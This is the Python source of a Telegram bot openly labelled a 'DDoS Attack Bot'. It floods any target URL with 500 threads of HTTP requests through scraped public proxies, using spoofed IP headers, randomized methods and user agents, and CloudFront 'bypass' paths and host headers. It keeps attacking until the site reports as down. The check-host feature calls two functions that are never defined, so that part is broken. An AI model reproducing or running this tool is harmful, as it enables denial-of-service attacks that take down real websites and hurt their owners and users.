import logging
import random
import threading
import requests
import asyncio
import time
import socket
import ssl
from urllib.parse import urlparse, quote
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
from telegram.constants import ParseMode
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes,
)

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
CHANNEL = "https://t.me/HASIB_BD_TUNNEL"
OWNER = "https://t.me/bouchor"
DIVIDER = "━━━━━━━━━━━━━━━━━━━━━━━━━━"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (compatible; Applebot/0.1; +http://www.apple.com/go/applebot)",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    "curl/8.6.0", "curl/8.5.0", "Wget/1.21.4", "python-requests/2.31.0",
    "okhttp/4.12.0", "Go-http-client/2.0", "Java/17.0.10", "PostmanRuntime/7.37.0",
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "Twitterbot/1.0", "LinkedInBot/1.0", "Slackbot-LinkExpanding 1.0",
]

METHODS = ["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS", "PATCH", "TRACE"]

REFS = [
    "https://www.google.com/", "https://www.bing.com/", "https://www.facebook.com/",
    "https://www.youtube.com/", "https://t.me/", "https://www.instagram.com/",
    "https://twitter.com/", "https://www.reddit.com/", "https://www.linkedin.com/",
    "https://duckduckgo.com/", "https://github.com/", "https://stackoverflow.com/",
    "https://www.wikipedia.org/", "https://www.yahoo.com/", "https://www.pinterest.com/",
    "https://www.tiktok.com/", "https://www.whatsapp.com/", "https://telegram.org/",
]

ACCEPT_LANGS = [
    "en-US,en;q=0.9", "en-GB,en;q=0.8", "bn-BD,bn;q=0.9,en;q=0.8",
    "hi-IN,hi;q=0.9,en;q=0.8", "ar-SA,ar;q=0.9,en;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8", "es-ES,es;q=0.9,en;q=0.8", "ru-RU,ru;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8", "ja-JP,ja;q=0.9,en;q=0.8", "ko-KR,ko;q=0.9,en;q=0.8",
]

ACCEPT_TYPES = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "application/json,text/plain,*/*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "*/*",
    "image/avif,image/webp,image/apng,image/*,*/*;q=0.8",
    "application/xml,text/xml,*/*;q=0.9",
]

CACHE_CONTROLS = ["no-cache", "no-store", "max-age=0", "must-revalidate", "private"]

PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
]

CF_TRIGGER_HEADERS = ["cf-ray", "cf-cache-status", "cf-request-id", "x-amz-cf-id", "x-amz-cf-pop"]

BYPASS_PATHS = [
    "/", "/?x=1", "/..;/", "/.%2e/", "/%2e/", "//", "/./",
    "/index.php", "/index.html", "/api", "/admin", "/%50SEMHUB/",
    "/;", "/%3b", "/%00", "/%0d%0a", "/%2f", "/%5c", "/%252e",
    "/.%252e/", "/%c0%ae%c0%ae/", "/%uff0e%uff0e/",
]

CF_BYPASS_HOSTS = ["origin", "direct", "real", "origin-www", "backend", "internal", "direct-connect"]


def rand_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


def rand_headers(method="GET", bypass=False, host=None):
    h = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": random.choice(ACCEPT_TYPES),
        "Accept-Language": random.choice(ACCEPT_LANGS),
        "Accept-Encoding": random.choice(["gzip, deflate, br", "gzip, deflate", "identity", "br"]),
        "Connection": random.choice(["keep-alive", "close"]),
        "Referer": random.choice(REFS),
        "Origin": random.choice(REFS).rstrip("/"),
        "X-Forwarded-For": rand_ip(),
        "X-Forwarded-Host": host if host else rand_ip(),
        "X-Forwarded-Proto": random.choice(["http", "https"]),
        "X-Real-IP": rand_ip(),
        "X-Originating-IP": rand_ip(),
        "X-Remote-IP": rand_ip(),
        "X-Remote-Addr": rand_ip(),
        "X-Client-IP": rand_ip(),
        "X-Host": host if host else rand_ip(),
        "CF-Connecting-IP": rand_ip(),
        "CF-IPCountry": random.choice(["BD", "US", "IN", "GB", "DE", "JP", "SG"]),
        "True-Client-IP": rand_ip(),
        "Forwarded": f"for={rand_ip()};proto={random.choice(['http','https'])};by={rand_ip()}",
        "Cache-Control": random.choice(CACHE_CONTROLS),
        "Pragma": "no-cache",
        "DNT": "1",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": random.choice(["document", "empty", "script", "image"]),
        "Sec-Fetch-Mode": random.choice(["navigate", "cors", "no-cors"]),
        "Sec-Fetch-Site": random.choice(["none", "same-origin", "cross-site"]),
        "Sec-Fetch-User": "?1",
        "Sec-CH-UA": f'"Chromium";v="{random.randint(115,123)}", "Google Chrome";v="{random.randint(115,123)}", "Not A(Brand";v="24"',
        "Sec-CH-UA-Mobile": random.choice(["?0", "?1"]),
        "Sec-CH-UA-Platform": random.choice(['"Windows"', '"macOS"', '"Linux"', '"Android"', '"iOS"']),
        "Keep-Alive": f"timeout={random.randint(5, 120)}, max={random.randint(100, 1000)}",
        "Via": f"1.1 {rand_ip()}",
        "X-Requested-With": random.choice(["XMLHttpRequest", "com.android.browser"]),
        "X-Request-ID": f"{random.randint(100000000, 999999999)}",
        "X-Correlation-ID": f"{random.randint(100000000, 999999999)}",
    }
    if bypass:
        h.update({
            "X-Original-URL": random.choice(BYPASS_PATHS),
            "X-Rewrite-URL": random.choice(BYPASS_PATHS),
            "X-HTTP-Method-Override": random.choice(["GET", "POST", "PUT", "DELETE"]),
            "X-Forwarded-Prefix": random.choice(BYPASS_PATHS),
            "CF-Worker": "true",
            "X-Amz-Cf-Id": f"{random.randint(10000000,99999999)}_x",
            "X-Amzn-Trace-Id": f"Root=1-{random.randint(10000000,99999999)}-{random.randint(10000000,99999999)}",
            "CloudFront-Viewer-Country": "BD",
            "CloudFront-Is-Mobile-Viewer": random.choice(["true", "false"]),
            "X-Cache": random.choice(["Hit", "Miss", "Miss from cloudfront"]),
            "X-Cache-Hits": str(random.randint(0, 10)),
            "X-Served-By": f"cache-{random.randint(1000,9999)}",
            "Akamai-Origin-Hop": str(random.randint(1, 10)),
        })
    if method in ("POST", "PUT", "PATCH"):
        h["Content-Type"] = random.choice(["application/x-www-form-urlencoded", "application/json", "text/plain"])
    return h


class ProxyPool:
    def __init__(self):
        self.proxies = []
        self.lock = threading.Lock()

    def load(self):
        loaded = set()
        for src in PROXY_SOURCES:
            try:
                r = requests.get(src, timeout=15, headers={"User-Agent": random.choice(USER_AGENTS)})
                if r.status_code == 200:
                    for ln in r.text.splitlines():
                        ln = ln.strip()
                        if ln and ":" in ln and not ln.startswith("#"):
                            loaded.add(ln)
            except Exception:
                continue
        with self.lock:
            self.proxies = list(loaded)
        return len(self.proxies)

    def get(self):
        with self.lock:
            return random.choice(self.proxies) if self.proxies else None

    def count(self):
        with self.lock:
            return len(self.proxies)


class Attack:
    def __init__(self, url, threads, proxy_pool):
        self.url = url
        self.threads = threads
        self.stop = threading.Event()
        self.sent = self.ok = self.fail = self.proxy_used = self.bypass_used = 0
        self.cf_detected = False
        self.lock = threading.Lock()
        self.proxy_pool = proxy_pool
        parsed = urlparse(url)
        self.host = parsed.netloc
        self.scheme = parsed.scheme or "https"

    def detect_cloudfront(self):
        try:
            r = requests.get(self.url, timeout=10, allow_redirects=False, verify=False)
            headers = {k.lower(): v for k, v in r.headers.items()}
            if any(h in headers for h in CF_TRIGGER_HEADERS):
                self.cf_detected = True
            if "cloudfront" in headers.get("server", "").lower():
                self.cf_detected = True
            return self.cf_detected
        except Exception:
            return False

    def worker(self):
        s = requests.Session()
        s.max_redirects = 0
        while not self.stop.is_set():
            time.sleep(random.uniform(0.02, 0.15))
            proxy = None
            if random.random() < 0.75:
                p = self.proxy_pool.get()
                if p:
                    proxy = {"http": f"http://{p}", "https": f"http://{p}"}
            bypass = random.random() < 0.6
            target = self.url
            host_hdr = None
            if bypass:
                path = random.choice(BYPASS_PATHS)
                target = f"{self.scheme}://{self.host}{path}"
                if random.random() < 0.3:
                    host_hdr = f"{random.choice(CF_BYPASS_HOSTS)}.{self.host}"
            try:
                method = random.choice(METHODS)
                kwargs = {"headers": rand_headers(method, bypass, host_hdr), "timeout": 12, "allow_redirects": False, "verify": False}
                if proxy:
                    kwargs["proxies"] = proxy
                if method in ("GET", "HEAD", "OPTIONS", "DELETE", "TRACE"):
                    r = s.request(method, target, **kwargs)
                else:
                    kwargs["data"] = {"x": random.randint(1, 99999), "y": "a" * random.randint(10, 500)}
                    r = s.request(method, target, **kwargs)
                with self.lock:
                    self.sent += 1
                    if proxy:
                        self.proxy_used += 1
                    if bypass:
                        self.bypass_used += 1
                    if r.status_code < 400:
                        self.ok += 1
                    else:
                        self.fail += 1
            except Exception:
                with self.lock:
                    self.sent += 1
                    self.fail += 1

    def run(self):
        self.detect_cloudfront()
        for _ in range(self.threads):
            threading.Thread(target=self.worker, daemon=True).start()

    def stop_attack(self):
        self.stop.set()

    def stats(self):
        with self.lock:
            return self.sent, self.ok, self.fail, self.proxy_used, self.bypass_used


def is_web_down(url):
    try:
        r = requests.get(url, timeout=8, allow_redirects=True, verify=False)
        return r.status_code >= 500
    except Exception:
        return True


def main_menu_text():
    return (
        "🌟 <b>DDoS Attack Bot</b>\n"
        f"{DIVIDER}\n\n"
        "🔹 <b>/attack</b> — Start attack\n"
        "🔹 <b>/stop</b> — Stop running attack\n"
        "🔹 <b>/status</b> — Live attack status\n"
        "🔹 <b>/checkhost</b> — Check host via Check-Host.net\n"
        "🔹 <b>/proxies</b> — Reload proxy list\n"
        "🔹 <b>/help</b> — How to use\n\n"
        f"{DIVIDER}\n"
        f"📢 <a href='{CHANNEL}'>Channel</a>  •  👤 <a href='{OWNER}'>Owner</a>"
    )


def main_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 Start Attack", callback_data="attack")],
        [InlineKeyboardButton("📊 Status", callback_data="status"), InlineKeyboardButton("🛑 Stop", callback_data="stop")],
        [InlineKeyboardButton("🌐 Check-Host", callback_data="checkhost")],
        [InlineKeyboardButton("🔄 Reload Proxies", callback_data="proxies")],
        [InlineKeyboardButton("📢 Channel", url=CHANNEL), InlineKeyboardButton("👤 Owner", url=OWNER)],
    ])


def attack_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🛑 Stop Attack", callback_data="stop")],
        [InlineKeyboardButton("🌐 Check-Host", callback_data="checkhost")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="menu")],
    ])


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(main_menu_text(), reply_markup=main_keyboard(), parse_mode=ParseMode.HTML, disable_web_page_preview=True)


async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "ℹ️ <b>How To Use</b>\n"
        f"{DIVIDER}\n\n"
        "1️⃣ /attack → send target link\n"
        "2️⃣ Bot runs attack and site down or /stop\n"
        "3️⃣ /checkhost → send host to get Check-Host report\n"
        "4️⃣ Bot auto-detects CloudFront and applies bypass headers\n"
        "5️⃣ Multiple attack methods with random IP spoofing, rotating user agents, 8 HTTP methods, proxy pool of thousands\n\n"
        f"{DIVIDER}\n📢 <a href='{CHANNEL}'>Channel</a>  •  👤 <a href='{OWNER}'>Owner</a>"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)


async def attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["waiting_url"] = True
    pool = context.bot_data.get("proxy_pool")
    cnt = pool.count() if pool else 0
    await update.message.reply_text(
        f"🚀 <b>Start Attack</b>\n{DIVIDER}\n\n🌐 Proxies: <code>{cnt}</code>\n\nSend target link:\n<code>https://target.com</code>",
        reply_markup=attack_keyboard(), parse_mode=ParseMode.HTML,
    )


async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    atk = context.user_data.get("attack")
    if atk:
        atk.stop_attack()
        context.user_data["attack"] = None
        await update.message.reply_text("🛑 <b>Attack stopped.</b>", parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text("⚠️ No attack running.", parse_mode=ParseMode.HTML)


async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    atk = context.user_data.get("attack")
    if not atk:
        await update.message.reply_text("⚠️ No attack running.", parse_mode=ParseMode.HTML)
        return
    sent, ok, fail, pused, byp = atk.stats()
    cf = "Yes" if atk.cf_detected else "No"
    await update.message.reply_text(
        f"📊 <b>Status</b>\n{DIVIDER}\n🎯 <code>{atk.url}</code>\n☁️ CloudFront: <code>{cf}</code>\n📤 Sent: <code>{sent}</code>\n✅ OK: <code>{ok}</code>\n❌ Fail: <code>{fail}</code>\n🌐 Proxies: <code>{pused}</code>\n🛡️ Bypass: <code>{byp}</code>",
        parse_mode=ParseMode.HTML,
    )


async def checkhost_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["waiting_checkhost"] = True
    await update.message.reply_text(
        "🌐 <b>Check-Host</b>\n\nSend host to check (e.g. <code>https://example.com</code> or <code>example.com</code>):",
        parse_mode=ParseMode.HTML,
    )


async def proxies_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = await update.message.reply_text("🔄 <b>Loading proxies...</b>", parse_mode=ParseMode.HTML)
    pool = context.bot_data.get("proxy_pool") or ProxyPool()
    context.bot_data["proxy_pool"] = pool
    count = await asyncio.to_thread(pool.load)
    await msg.edit_text(f"✅ <b>Proxies Loaded</b>\n{DIVIDER}\n🌐 Total: <code>{count}</code>", parse_mode=ParseMode.HTML)


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    data = q.data
    if data == "menu":
        await q.message.reply_text(main_menu_text(), reply_markup=main_keyboard(), parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    elif data == "attack":
        context.user_data["waiting_url"] = True
        pool = context.bot_data.get("proxy_pool")
        cnt = pool.count() if pool else 0
        await q.message.reply_text(f"🚀 <b>Start Attack</b>\n{DIVIDER}\n🌐 Proxies: <code>{cnt}</code>\n\nSend target link:", reply_markup=attack_keyboard(), parse_mode=ParseMode.HTML)
    elif data == "stop":
        atk = context.user_data.get("attack")
        if atk:
            atk.stop_attack()
            context.user_data["attack"] = None
            await q.message.reply_text("🛑 <b>Attack stopped.</b>", parse_mode=ParseMode.HTML)
        else:
            await q.message.reply_text("⚠️ No attack running.", parse_mode=ParseMode.HTML)
    elif data == "status":
        atk = context.user_data.get("attack")
        if not atk:
            await q.message.reply_text("⚠️ No attack running.", parse_mode=ParseMode.HTML)
        else:
            sent, ok, fail, pused, byp = atk.stats()
            cf = "Yes" if atk.cf_detected else "No"
            await q.message.reply_text(f"📊 <b>Status</b>\n🎯 <code>{atk.url}</code>\n☁️ CloudFront: <code>{cf}</code>\n📤 Sent: <code>{sent}</code>\n✅ OK: <code>{ok}</code>\n❌ Fail: <code>{fail}</code>\n🌐 Proxies: <code>{pused}</code>\n🛡️ Bypass: <code>{byp}</code>", parse_mode=ParseMode.HTML)
    elif data == "checkhost":
        context.user_data["waiting_checkhost"] = True
        await q.message.reply_text("🌐 <b>Check-Host</b>\n\nSend host to check:", parse_mode=ParseMode.HTML)
    elif data == "proxies":
        msg = await q.message.reply_text("🔄 <b>Loading proxies...</b>", parse_mode=ParseMode.HTML)
        pool = context.bot_data.get("proxy_pool") or ProxyPool()
        context.bot_data["proxy_pool"] = pool
        count = await asyncio.to_thread(pool.load)
        await msg.edit_text(f"✅ <b>Proxies Loaded</b>\n{DIVIDER}\n🌐 Total: <code>{count}</code>", parse_mode=ParseMode.HTML)


async def monitor_until_down(context, chat_id, atk):
    down_counter = 0
    while not atk.stop.is_set():
        await asyncio.sleep(30)
        if atk.stop.is_set():
            break
        sent, ok, fail, pused, byp = atk.stats()
        cf = "Yes" if atk.cf_detected else "No"
        try:
            await context.bot.send_message(chat_id=chat_id, text=f"⏳ <b>Running</b>\n{DIVIDER}\n🎯 <code>{atk.url}</code>\n☁️ CF: <code>{cf}</code> | 📤 <code>{sent}</code> | ✅ <code>{ok}</code> | ❌ <code>{fail}</code> | 🌐 <code>{pused}</code> | 🛡️ <code>{byp}</code>", parse_mode=ParseMode.HTML)
        except Exception:
            pass
        if is_web_down(atk.url):
            down_counter += 1
            if down_counter >= 2:
                atk.stop_attack()
                sent, ok, fail, pused, byp = atk.stats()
                cf = "Yes" if atk.cf_detected else "No"
                try:
                    await context.bot.send_message(chat_id=chat_id, text=f"🎯 <b>TARGET DOWN!</b>\n{DIVIDER}\n🎯 <code>{atk.url}</code>\n☁️ CloudFront: <code>{cf}</code>\n📤 Sent: <code>{sent}</code>\n✅ OK: <code>{ok}</code>\n❌ Fail: <code>{fail}</code>\n🌐 Proxies: <code>{pused}</code>\n🛡️ Bypass: <code>{byp}</code>\n{DIVIDER}\n📢 <a href='{CHANNEL}'>Channel</a>  •  👤 <a href='{OWNER}'>Owner</a>", parse_mode=ParseMode.HTML, disable_web_page_preview=True)
                except Exception:
                    pass
                context.user_data["attack"] = None
                return
        else:
            down_counter = 0


async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (update.message.text or "").strip()
    if not text:
        return

    if context.user_data.get("waiting_checkhost"):
        context.user_data["waiting_checkhost"] = False
        host = text
        if not host.startswith(("http://", "https://")):
            host = "http://" + host
        msg = await update.message.reply_text("🌐 <b>Checking via Check-Host...</b>", parse_mode=ParseMode.HTML)
        result = await asyncio.to_thread(check_host_http, host)
        if "error" in result:
            await msg.edit_text(f"❌ Check-Host error: <code>{result['error']}</code>", parse_mode=ParseMode.HTML)
            return
        await asyncio.sleep(5)
        detail = await asyncio.to_thread(get_check_host_result, result["request_id"])
        report = result["permanent_link"]
        summary = ""
        if isinstance(detail, dict) and detail:
            for node, data in detail.items():
                if isinstance(data, list) and data:
                    entry = data[0]
                    if isinstance(entry, list) and len(entry) >= 4:
                        status = entry[3] if len(entry) > 3 else "?"
                        code = entry[4] if len(entry) > 4 else "?"
                        summary += f"• {node}: HTTP {code} ({status})\n"
        text_out = f"🌐 <b>Check-Host Report</b>\n{DIVIDER}\n🎯 <code>{host}</code>\n\n{summary or 'No node data yet, check link below.'}\n\n🔗 <a href='{report}'>Full Report</a>"
        await msg.edit_text(text_out[:4000], parse_mode=ParseMode.HTML, disable_web_page_preview=True)
        return

    if not context.user_data.get("waiting_url"):
        return

    if not text.startswith(("http://", "https://")):
        await update.message.reply_text("❌ Invalid URL. Must start with http:// or https://", parse_mode=ParseMode.HTML)
        return

    context.user_data["waiting_url"] = False
    old = context.user_data.get("attack")
    if old:
        old.stop_attack()

    pool = context.bot_data.get("proxy_pool") or ProxyPool()
    context.bot_data["proxy_pool"] = pool
    if pool.count() == 0:
        await update.message.reply_text("🔄 Loading proxies first time...", parse_mode=ParseMode.HTML)
        await asyncio.to_thread(pool.load)

    atk = Attack(text, 500, pool)
    context.user_data["attack"] = atk
    atk.run()

    cf_status = "Detected" if atk.cf_detected else "Not Detected"

    await update.message.reply_text(
        f"🚀 <b>ATTACK STARTED</b>\n{DIVIDER}\n🎯 <code>{text}</code>\n🧵 Threads: <code>500</code>\n🌐 Proxies: <code>{pool.count()}</code>\n☁️ CloudFront: <code>{cf_status}</code>\n🔀 Methods: <code>{len(METHODS)}</code>\n🎭 User-Agents: <code>{len(USER_AGENTS)}</code>\n\nBot will run unlimited until site down.\n/status — Live report\n/stop — Stop manually\n/checkhost — Verify via Check-Host",
        reply_markup=attack_keyboard(), parse_mode=ParseMode.HTML,
    )
    asyncio.create_task(monitor_until_down(context, update.effective_chat.id, atk))


async def post_init(app: Application):
    await app.bot.set_my_commands([
        BotCommand("start", "Start the bot"),
        BotCommand("attack", "Start attack"),
        BotCommand("stop", "Stop attack"),
        BotCommand("status", "Attack status"),
        BotCommand("checkhost", "Check host via Check-Host.net"),
        BotCommand("proxies", "Reload proxies"),
        BotCommand("help", "How to use"),
    ])
    app.bot_data["proxy_pool"] = ProxyPool()
    logger.info("Loading initial proxies...")
    count = await asyncio.to_thread(app.bot_data["proxy_pool"].load)
    logger.info(f"Loaded {count} proxies")


def main():
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("attack", attack_cmd))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("checkhost", checkhost_cmd))
    app.add_handler(CommandHandler("proxies", proxies_cmd))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    logger.info("Bot starting...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
